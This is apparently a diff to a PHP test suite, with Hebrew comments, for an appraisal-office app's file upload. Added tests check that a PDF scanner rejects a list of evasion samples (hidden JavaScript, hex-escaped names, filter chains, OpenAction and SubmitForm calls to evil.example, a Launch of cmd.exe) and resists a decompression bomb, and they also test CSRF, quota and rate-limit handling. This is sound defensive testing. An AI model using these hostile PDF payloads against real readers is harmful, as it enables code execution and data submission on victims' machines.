@@ -21,7 +21,8 @@ if (in_array($argv[1] ?? '', ['reviewer', 'uploader'], true)) {
 require __DIR__ . '/lib.php';
 
 $warnings = [];
-set_error_handler(function (int $no, string $msg, string $file, int $line) use (&$warnings) { $warnings[] = "$msg @" . basename($file) . ":$line"; return true; });
+$GLOBALS['apr_upload_rate'] = [100000, 600];   // הקצב נבדק בנפרד, למטה
+set_error_handler(function (int $no, string $msg, string $file, int $line) use (&$warnings) { if (!(error_reporting() & $no)) return true; $warnings[] = "$msg @" . basename($file) . ":$line"; return true; });
 
 $owner = ident('1', 'הבעלים', 'owner@example.com', ['platform_admin' => true]);
 $avi = ident('2', 'אבי', 'avi@example.com');       // מנהל משרד א, שמאי — האחראי על התיקים
@@ -69,7 +70,7 @@ function make_case(string $as, string $profile, string $title = 'דירה ברח
 function pdf(string $extra = '', string $mark = ''): string
 {
     return "%PDF-1.4\n%$mark\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n3 0 obj\n<< /Type /Page /Parent 2 0 R >>\nendobj\n"
-        . "4 0 obj\n<< /Length 9 >>\nstream\n/JS (x) q\nendstream\nendobj\n$extra\ntrailer\n<< /Root 1 0 R >>\n%%EOF\n";
+        . "4 0 obj\n<< /Length 9 >>\nstream\nBT (x) Tj ET\nendstream\nendobj\n$extra\ntrailer\n<< /Root 1 0 R >>\n%%EOF\n";
 }
 function img(string $type, int $w = 40, int $h = 30): string
 {
@@ -288,6 +289,45 @@ unset($GLOBALS['apr_scanner']);
 $GLOBALS['apr_scanner_bin'] = null;
 eq([$frow($cl[1]['file'])['scan_state'], $frow($F1)['scan_state'], $docs($avi, $C)[1]['limits']['scanner']], ['clean', 'not_scanned', false], '06-E4 בלי סורק: scan_state = not_scanned, והתשובה אומרת שאין סורק');
 
+// ── סבב 2, 🟡3: עקיפות של בדיקת התוכן הפעיל ב-PDF — כל אחת נדחית ──
+$n = $nfiles();
+$hex = fn(string $s) => strtoupper(bin2hex($s)) . '>';
+$evasions = [
+    'הערה שמסתירה (% stream)' => pdf("% stream\n5 0 obj << /S /JavaScript /JS (app.alert(1)) >> endobj\n% endstream"),
+    'בתוך מחרוזת' => pdf("5 0 obj << /T (stream\n) /JS 6 0 R /X (endstream) >> endobj"),
+    'ObjStm בלי Filter' => pdf("5 0 obj\n<< /Type /ObjStm /N 1 /First 4 >>\nstream\n6 0 << /S /JavaScript /JS (x) >>\nendstream\nendobj"),
+    'שם עם #xx' => pdf('5 0 obj << /S /#4AavaScript /J#53 (x) >> endobj'),
+    'שרשרת פילטרים' => pdf("5 0 obj\n<< /Type /ObjStm /Filter [/ASCIIHexDecode /FlateDecode] >>\nstream\n" . $hex(gzcompress('6 0 << /JS (x) >>')) . "\nendstream\nendobj"),
+    'קיצור של פילטר' => pdf("5 0 obj\n<< /Filter [/AHx /Fl] >>\nstream\n" . $hex(gzcompress('x')) . "\nendstream\nendobj"),
+    'OpenAction עם URI' => pdf('5 0 obj << /Type /Catalog /OpenAction << /S /URI /URI (http://evil.example/) >> >> endobj'),
+    'OpenAction בהפניה' => pdf('5 0 obj << /Type /Catalog /OpenAction 6 0 R >> endobj'),
+    'OpenAction עם הערה לפני הערך' => pdf("5 0 obj << /OpenAction %x\n << /S /GoTo >> >> endobj"),
+    'AA' => pdf('5 0 obj << /Type /Page /AA << /O 6 0 R >> >> endobj'),
+    'SubmitForm' => pdf('5 0 obj << /S /SubmitForm /F (http://evil.example/) >> endobj'),
+    'XFA' => pdf('5 0 obj << /AcroForm << /XFA 6 0 R >> >> endobj'),
+    'Launch' => pdf('5 0 obj << /S /Launch /Win << /F (cmd.exe) >> >> endobj'),
+    'JS בזרם Flate רגיל' => pdf("5 0 obj\n<< /Filter /FlateDecode >>\nstream\n" . gzcompress(str_repeat('q ', 5000) . '<< /S /JavaScript /JS (x) >>') . "\nendstream\nendobj"),
+    'JS עם הערה לפני הערך' => pdf("5 0 obj << /JS %c\n (x) >> endobj"),
+    'RichMedia' => pdf('5 0 obj << /Subtype /RichMedia >> endobj'),
+];
+$got = array_map(fn($b) => code(up($avi, $b, ['case' => $C])), $evasions);
+eq([array_keys(array_filter($got, fn($c) => $c !== 'file_active')), $nfiles() - $n], [[], 0], '06-B2 (סבב 2) כל עקיפה שנמנתה בביקורת נדחית');
+$benign = ['יעד פתיחה (מערך)' => pdf('5 0 obj << /Type /Catalog /OpenAction [3 0 R /Fit] >> endobj', 'b1'), 'קישור רגיל' => pdf('5 0 obj << /Type /Annot /Subtype /Link /A << /S /URI /URI (https://example.org/JS/AA) >> >> endobj', 'b2'),
+    'זרם Flate תמים' => pdf("5 0 obj\n<< /Filter /FlateDecode >>\nstream\n" . gzcompress(str_repeat('BT (JS AA text) Tj ET ', 3000)) . "\nendstream\nendobj", 'b3')];
+eq(array_map(fn($b) => up($avi, $b, ['case' => $D])[0], $benign), array_fill_keys(array_keys($benign), 200), 'PDF תמים עם יעד פתיחה, קישור וזרם דחוס — מתקבל');
+// 🔴1: זמן ליניארי. הקלט מהביקורת — אלפי זרמים קטנים — ועוד שניים שמנסים לגרום לפריסה חוזרת
+$t0 = microtime(true);
+$tmpf = tempnam(apr_upload_tmp_dir(), 'dos');
+foreach (["1 0 obj\n<< /Length 1 >>\nstream\nx\nendstream\nendobj\n", "stream\n\x78\x9c" . 'aaaa', "stream\n" . substr(gzcompress(str_repeat('A', 3_000_000)), 0, 40)] as $unit) {
+    file_put_contents($tmpf, '%PDF-1.4' . "\n" . str_repeat($unit, intdiv(4 << 20, strlen($unit))) . "\n%%EOF\n");
+    try { apr_file_sniff($tmpf); } catch (AprFileRejected) {}
+}
+file_put_contents($tmpf, '%PDF-1.4' . "\n" . str_repeat("stream\n" . gzcompress(str_repeat("\0", 20_000_000)) . "\n", 12) . "%%EOF\n");   // "פצצה": 240MB אחרי פריסה
+try { apr_file_sniff($tmpf); } catch (AprFileRejected) {}
+unlink($tmpf);
+$took = microtime(true) - $t0;
+check('🔴1 בדיקת PDF ליניארית: ארבעה קלטים עוינים של 4MB (אלפי זרמים, פריסה חוזרת, פצצת דחיסה) — פחות מ-6 שניות יחד', $took < 6.0, round($took, 2));
+
 // ── 06-B3: גודל ──
 $n = $nfiles(); $d = $disk();
 $GLOBALS['apr_file_max'] = 400;
@@ -298,6 +338,38 @@ eq([$big[0], code($big), code($pre), $nfiles() - $n, $disk() - $d, $rrow($R['pla
 check('06-B3 ההודעה נושאת את הגודל המותר', str_contains($pre[1]['error']['message'], intdiv(apr_file_max(), 1048576) . 'MB') && apr_file_max() <= APR_FILE_MAX && APR_FILE_MAX === 25 * 1024 * 1024, $pre[1]['error']['message']);
 eq([code(call('POST', 'file-upload', ['case' => $C], $avi)), code(call('POST', 'file-upload', ['case' => $C], $avi, [], ['env' => ['upload' => '/nonexistent/x']])), code(up($avi, pdf(), ['case' => $C], ['upload_error' => 'storage_full']))],
     ['file_missing', 'file_missing', 'storage_full'], 'בלי קובץ ← file_missing; אין מקום בדיסק (מקרה 10) ← הודעה ברורה');
+
+// ── 🔴2: גוף הבקשה נקרא רק אחרי זהות, CSRF, הרשאה בתיק ומכסה ──
+$read = 0;
+$reader = function () use (&$read) { $read++; $t = tempnam(apr_upload_tmp_dir(), 'up'); file_put_contents($t, pdf('', 'reader' . $read)); return ['upload' => $t]; };
+$via = fn(?string $as, array $q, array $opt = []) => call('POST', 'file-upload', $q + ['name' => 'r.pdf'], $as, [], $opt + ['env' => ['upload_reader' => $reader]]);
+$n = $nfiles();
+$tries = [$via(null, ['case' => $C])[0], $via($avi, ['case' => $C], ['csrf' => 'wrong'])[0], code($via($boaz, ['case' => $C])), code($via($gil, ['case' => $C])), code($via($ron, ['case' => $C])),
+    code($via($avi, ['case' => 'zzzzzzzzzzzzzzzz'])), code($via($avi, ['case' => ['x']]))];
+eq([$tries, $read, $nfiles() - $n], [[401, 403, 'not_found', 'not_found', 'forbidden', 'not_found', 'not_found'], 0, 0], '🔴2 בלי זהות, בלי CSRF, משרד אחר, לא משתתף, בלי documents, תיק שלא קיים — הגוף לא נקרא כלל');
+$GLOBALS['apr_quota'] = [(int)apr_val('SELECT SUM(size) FROM files WHERE case_id = ?', [$crow($C)['id']]), PHP_INT_MAX];
+$qc = code($via($avi, ['case' => $C]));
+$GLOBALS['apr_quota'] = [PHP_INT_MAX, (int)apr_val('SELECT SUM(size) FROM files')];
+$qo = code($via($avi, ['case' => $C]));
+$GLOBALS['apr_quota'] = [(int)apr_val('SELECT SUM(size) FROM files WHERE case_id = ?', [$crow($C)['id']]) + 50, PHP_INT_MAX];
+$qs = [code($via($avi, ['case' => $C])), $read];        // יש מקום לבית אחד, אבל לא לקובץ: הגוף נקרא, והקובץ נדחה
+unset($GLOBALS['apr_quota']);
+eq([$qc, $qo, $qs, $nfiles() - $n, $disk() >= 0], ['quota_case', 'quota_office', ['quota_case', 1], 0, true], '🟡4 תקרת נפח לתיק ולמשרד: מלא ← נדחה לפני קריאת הגוף; קובץ שחורג ← נדחה ולא נשמר');
+$GLOBALS['apr_upload_rate'] = [(int)apr_val("SELECT count FROM login_attempts WHERE key = ?", ['upload:' . $crow($C)['responsible_user_id']]) + 1, 600];
+$ra = $via($avi, ['case' => $C]);
+$rb = $via($avi, ['case' => $C]);
+$rc = code($via($tal, ['case' => $C, 'dup' => '1']));
+$GLOBALS['apr_time'] = time() + 601;
+$rd = $via($avi, ['case' => $C, 'dup' => '1'])[0];
+unset($GLOBALS['apr_time']);
+$GLOBALS['apr_upload_rate'] = [100000, 600];
+eq([$ra[0], $rb[0], code($rb), $rc, $rd, $read], [200, 429, 'upload_rate', null, 200, 4], '🟡4 הגבלת קצב למשתמש: מעבר לתקרה ← 429 בלי לקרוא את הגוף; משתמש אחר אינו מושפע; אחרי החלון — שוב מותר');
+// 🟡6: הטרנזקציה נכשלת אחרי שהקובץ כבר נשמר לדיסק — לא נשאר קובץ יתום
+$n = $nfiles(); $d = $disk();
+$GLOBALS['apr_after_store'] = function () { throw new AprError('storage'); };
+$boom = up($avi, pdf('', 'orphan'), ['case' => $C, 'requirement' => $R['plan']]);
+unset($GLOBALS['apr_after_store']);
+eq([code($boom), $nfiles() - $n, $disk() - $d, $rrow($R['plan'])['status'], is_file($GLOBALS['t_tmp']), count(glob(apr_upload_tmp_dir() . '/*') ?: [])], ['storage', 0, 0, 'required', false, 0], '🟡6 כישלון בתוך הטרנזקציה אחרי השמירה לדיסק ← אין שורה, אין קובץ יתום, אין קובץ זמני');
 
 // ── 06-B4: כפילות באותו תיק ──
 $n = $nfiles(); $d = $disk();
@@ -475,6 +547,19 @@ up($tal, pdf('', 'pend2'), ['case' => $C, 'requirement' => $R['permit']]);
 eq([in_array($R['permit'], $pend($dana), true), in_array($RD['contract'], $pend($dana), true), in_array($RD['contract'], $pend($avi), true), $pend($tal), $pend($boaz), $pend($gil)], [true, false, true, [], [], []],
     'הלוח: "ממתינים לבדיקה" — רק בתיקים שיש לי בהם review_docs');
 
+// 🟡6: חבר שהוסר מהתיק, ומי שהמשרד הפעיל שלו אחר — אינם מוצאים דבר
+$uri = ident('9', 'אורי', 'uri@example.com');
+$uriPid = join_office($avi, $uri, 'uri@example.com', 'appraiser');
+call('POST', 'case-member-add', ['case' => $C, 'user' => $uriPid], $avi);
+$in = [$cases($sr($uri, 'נסח')), call('GET', 'docs-pending', [], $uri)[1]['pending'] !== []];
+join_office($boaz, $uri, 'uri@example.com', 'appraiser');
+$offB = array_column(call('GET', 'me', [], $uri)[1]['offices'], 'pid', 'name')['משרד ב'];
+call('POST', 'office-switch', ['office' => $offB], $uri);
+$other = [$sr($uri, 'נסח'), call('GET', 'docs-pending', [], $uri)[1]['pending']];
+call('POST', 'office-switch', ['office' => array_column(call('GET', 'me', [], $uri)[1]['offices'], 'pid', 'name')['משרד א']], $uri);
+call('POST', 'case-member-remove', ['case' => $C, 'user' => $uriPid], $avi);
+eq([$in, $other, $sr($uri, 'נסח'), call('GET', 'docs-pending', [], $uri)[1]['pending']], [[[$C], true], [[], []], [], []], '06-C4 (סבב 2) משתתף מוצא; כשהמשרד הפעיל אחר — לא; אחרי שהוסר מהתיק — לא (חיפוש ו"ממתינים לבדיקה")');
+
 // ── 06-D1: פיצול לגורמים ──
 $lawyer = call('POST', 'case-party-add', ['case' => $C, 'name' => 'עו"ד כהן', 'kind' => 'lawyer'], $avi)[1]['party'];
 $client = apr_val("SELECT pid FROM case_parties WHERE case_id = ? AND kind = 'client'", [$crow($C)['id']]);
@@ -504,6 +589,18 @@ $cnt[] = $open($avi);
 call('POST', 'requirement-status', ['requirement' => $sp[1]['requirements'][1], 'status' => 'not_relevant', 'reason' => 'אין עו"ד'], $dana);
 $cnt[] = $open($avi);
 eq([$cnt[1] - $cnt[0], $cnt[2] - $cnt[0], $cnt[3] - $cnt[0]], [0, -1, -2], 'דרישת חובה שהתקבלה ועוד לא אושרה — עדיין פתוחה; מאושרת או "לא רלוונטי" — לא');
+
+// מעבר שאינו שינוי אינו נרשם
+$na = count($log($C, 'requirement.status'));
+$same = call('POST', 'requirement-status', ['requirement' => $sp[1]['requirements'][1], 'status' => 'not_relevant', 'reason' => 'שוב'], $dana);
+eq([$same[0], count($log($C, 'requirement.status')) - $na], [200, 0], 'מעבר למצב הנוכחי (not_relevant ← not_relevant) אינו רושם שורת יומן');
+// תמונה מעל 16 מגה-פיקסל: בלי תמונה ממוזערת (אייקון), והקובץ עצמו מתקבל
+$bigPng = img('png');
+$bigPng = substr($bigPng, 0, 16) . pack('NN', 5000, 4000) . substr($bigPng, 24);
+$bp = up($tal, $bigPng, ['case' => $C, 'name' => 'ענק.png']);
+eq([$bp[0], code(call('GET', 'file-thumb', [], $avi, ['file' => $bp[1]['file'] ?? '']))], [200, 'not_found'], '🟡5 תמונה של 20 מגה-פיקסל: מתקבלת, בלי תמונה ממוזערת');
+$hdr = call('GET', 'file', [], $avi, ['file' => $bp[1]['file']])[1]['_file']['headers']['Content-Disposition'];
+check('שם עברי: filename="file.png" (ולא "_.png"), ו-filename* עם השם המלא', str_contains($hdr, 'filename="file.png"') && str_contains($hdr, rawurlencode('ענק.png')), $hdr);
 
 // ── סדר וקבוצה ──
 $ord = call('POST', 'requirement-order', ['case' => $C, 'items' => [['requirement' => $R['permit'], 'group' => 'legal'], ['requirement' => $R['rights']], ['requirement' => $R['id'], 'group' => null]]], $tal);
